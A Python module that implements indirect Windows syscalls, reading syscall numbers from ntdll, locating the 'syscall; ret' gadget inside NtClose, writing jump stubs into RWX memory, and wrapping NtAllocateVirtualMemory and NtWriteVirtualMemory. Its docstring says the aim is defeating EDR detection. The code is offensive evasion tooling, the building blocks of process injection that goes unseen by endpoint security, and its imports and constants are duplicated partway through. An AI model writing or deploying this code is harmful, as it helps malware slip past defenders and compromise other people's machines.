"""Indirect syscall — reads syscall stub from ntdll so the syscall instruction
executes inside ntdll's mapped region, defeating EDR checks for stubs in
non-ntdll memory.  The built stub movs r10←rcx, sets eax←SSN, then jmps to
the ``syscall; ret`` that already lives inside ntdll.dll.
"""
import os
import ctypes
import struct
from ctypes import wintypes

MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40
import ctypes
import struct
from ctypes import wintypes

MEM_COMMIT, MEM_RESERVE = 0x1000, 0x2000
PAGE_EXECUTE_READWRITE, NTSTATUS = 0x40, ctypes.c_long


def get_nt_func_address(func_name):
    """Get address of an ntdll.dll export. Returns 0 on failure."""
    if os.name != 'nt':
        return 0
    return ctypes.windll.kernel32.GetProcAddress(
        ctypes.windll.ntdll._handle, func_name.encode())


def get_ssn(func_name):
    """Extract syscall number from ntdll stub at offset 4 (x64)."""
    if os.name != 'nt':
        return 0
    addr = get_nt_func_address(func_name)
    if not addr:
        return 0
    raw = (ctypes.c_ubyte * 4).from_address(addr + 4)
    return raw[0] | (raw[1] << 8)


def get_syscall_stub_addr():
    """Locate ``syscall; ret`` (0x0F 0x05 C3) inside NtClose stub."""
    if os.name != 'nt':
        return 0
    addr = get_nt_func_address('NtClose')
    if not addr:
        return 0
    for off in range(0, 32):
        b0 = ctypes.c_ubyte.from_address(addr + off).value
        b1 = ctypes.c_ubyte.from_address(addr + off + 1).value
        if b0 == 0x0F and b1 == 0x05:
            return addr + off
    return 0


def _build_stub(ssn):
    """Assemble: mov r10,rcx; mov eax,ssn; mov r11,gadget; jmp r11."""
    gadget = get_syscall_stub_addr()
    if not gadget:
        return None
    stub = bytearray()
    stub += b'\x4C\x8B\xD1'
    stub += bytes([0xB8, ssn & 0xFF, (ssn >> 8) & 0xFF, 0, 0])
    stub += b'\x49\xBB' + struct.pack('<Q', gadget) + b'\x41\xFF\xE3'
    return bytes(stub)


def _alloc_stub(stub_bytes):
    """VirtualAlloc RWX + copy stub. Returns address or 0."""
    if not stub_bytes:
        return 0
    sz = len(stub_bytes)
    addr = ctypes.windll.kernel32.VirtualAlloc(
        0, sz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if not addr:
        return 0
    ctypes.memmove(addr, stub_bytes, sz)
    return addr


def execute_indirect_syscall(ssn, args):
    """Build stub on heap, push args into regs, jmp to ntdll syscall;ret."""
    if os.name != 'nt':
        return None
    addr = _alloc_stub(_build_stub(ssn))
    if not addr:
        return None
    arg_types = [ctypes.c_uint64] * max(4, len(args))
    proto = ctypes.CFUNCTYPE(NTSTATUS, *arg_types)
    a = list(args) + [0] * (len(arg_types) - len(args))
    return proto(addr)(*a)


def indirect_NtAllocateVirtualMemory(handle, base_addr, zero_bits, region_size,
                                     alloc_type, protect):
    """Indirect syscall for NtAllocateVirtualMemory (6 args)."""
    if os.name != 'nt':
        return None
    ssn = get_ssn('NtAllocateVirtualMemory')
    addr = _alloc_stub(_build_stub(ssn))
    if not ssn or not addr:
        return None
    proto = ctypes.CFUNCTYPE(
        NTSTATUS, wintypes.HANDLE, ctypes.POINTER(ctypes.c_void_p), ctypes.c_size_t,
        ctypes.POINTER(ctypes.c_size_t), wintypes.ULONG, wintypes.ULONG)
    return proto(addr)(handle, base_addr, zero_bits, region_size, alloc_type, protect)


def indirect_NtWriteVirtualMemory(handle, target_addr, buf, size):
    """Indirect syscall for NtWriteVirtualMemory (5 args)."""
    if os.name != 'nt':
        return None
    ssn = get_ssn('NtWriteVirtualMemory')
    addr = _alloc_stub(_build_stub(ssn))
    if not ssn or not addr:
        return None
    bytes_written = ctypes.c_size_t(0)
    proto = ctypes.CFUNCTYPE(
        NTSTATUS, wintypes.HANDLE, ctypes.c_void_p, ctypes.c_void_p,
        ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t))
    return proto(addr)(handle, target_addr, buf, size, ctypes.byref(bytes_written))
